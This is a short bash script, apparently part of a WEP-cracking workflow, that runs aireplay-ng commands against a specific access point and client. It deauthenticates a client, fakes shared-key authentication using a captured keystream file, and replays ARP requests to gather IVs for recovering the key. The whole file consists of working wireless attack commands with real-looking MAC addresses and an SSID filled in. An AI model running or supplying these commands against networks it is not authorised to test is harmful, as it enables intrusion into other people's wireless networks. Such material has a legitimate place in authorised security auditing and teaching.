#!/bin/bash

#Step 4 - Use aireplay-ng to do a fake authentication with the access point
    aireplay-ng -0 1 -a 6C:B0:CE:17:AD:71 -c 50:68:0A:D5:02:B4 wlp2s0mon
    aireplay-ng -1 0 -e phome-wndr -y ./sharedkey-01-6C-B0-CE-17-AD-71.xor -a 6C:B0:CE:17:AD:71 -h 40:e2:30:e6:ef:54 wlp2s0mon

#Step 5 - Start aireplay-ng in ARP request replay mode
    aireplay-ng -3 -b 6C:B0:CE:17:AD:71 -h 40:e2:30:e6:ef:54 wlp2s0mon			#for grab ivs.
